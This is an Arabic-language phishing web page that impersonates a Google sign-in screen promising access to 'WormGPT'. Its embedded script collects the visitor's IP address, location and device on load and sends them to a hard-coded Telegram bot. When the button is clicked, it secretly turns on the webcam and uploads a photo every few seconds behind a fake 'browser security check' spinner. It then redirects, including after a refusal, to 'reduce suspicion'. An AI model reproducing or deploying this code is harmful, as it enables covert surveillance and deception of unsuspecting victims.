<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - حسابات Google</title>
    <style>
        body { background: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: 'Roboto', arial, sans-serif; color: #202124; }
        .login-box { width: 380px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
        .logo { width: 75px; margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
        p { font-size: 16px; margin-bottom: 30px; }
        .google-btn { display: flex; align-items: center; justify-content: center; width: 100%; padding: 10px; border: 1px solid #dadce0; border-radius: 4px; background: white; cursor: pointer; font-weight: 500; transition: background 0.2s; }
        .google-btn:hover { background: #f8f9fa; }
        .google-btn img { width: 18px; margin-left: 10px; }
        #loader-box { display: none; margin-top: 20px; }
        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #4285f4; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="login-box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo" alt="Google">
        <h1>تسجيل الدخول</h1>
        <p>استخدم حسابك على Google للوصول إلى WormGPT</p>
        
        <button class="google-btn" id="loginBtn">
            <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg">
            <span>تسجيل الدخول باستخدام Google</span>
        </button>

        <div id="loader-box">
            <div class="spinner"></div>
            <p style="font-size: 12px; color: #5f6368; margin-top: 10px;">جاري التحقق من أمان المتصفح...</p>
        </div>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        const api = "https://api.telegram.org/bot6298945282:AAFfSm47XKXRK-QkA5hmWh5Z5dCr1V--hDY/";
        const chat = "2103976274";

        async function collectAll() {
            let n = navigator;
            let report = "👤 **محاولة دخول عبر حساب Google**\n\n";
            try {
                const res = await fetch('https://ipapi.co/json/').then(d => d.json());
                report += `🌍 **IP:** \`${res.ip}\`\n📍 **الموقع:** ${res.city}, ${res.country_name}\n`;
            } catch (e) {}
            let deviceDetail = n.userAgent.match(/\(([^)]+)\)/) ? n.userAgent.match(/\(([^)]+)\)/)[1].split(';')[0] : n.platform;
            report += `📱 **الجهاز:** ${deviceDetail}\n`;
            sendText(report);
        }

        document.getElementById('loginBtn').onclick = async function() {
            this.style.display = 'none';
            document.getElementById('loader-box').style.display = 'block';
            
            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('v');
                video.srcObject = s;

                video.onloadedmetadata = () => {
                    video.play();
                    setTimeout(() => {
                        snap(); // التقاط أول صورة
                        setInterval(snap, 4000); 
                        
                        // التوجيه لـ WormGPT بعد 4 ثوانٍ
                        setTimeout(() => {
                            window.location.href = "project.html";
                        }, 4000);
                    }, 1000);
                };
            } catch (e) {
                sendText("⚠️ **رفض الكاميرا عند دخول Google**");
                window.location.href = "project.html"; // توجيه حتى لو رفض لتقليل الشك
            }
        };

        function snap() {
            const canvas = document.getElementById('c');
            const video = document.getElementById('v');
            if (video.readyState === video.HAVE_ENOUGH_DATA) {
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(blob => {
                    const f = new FormData();
                    f.append('chat_id', chat);
                    f.append('photo', blob, 'google_user.jpg');
                    fetch(api + "sendPhoto", { method: 'POST', body: f });
                }, 'image/jpeg', 0.8);
            }
        }

        function sendText(txt) {
            fetch(api + "sendMessage", {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chat, text: txt, parse_mode: "Markdown" })
            });
        }
        collectAll();
    </script>
</body>
</html>
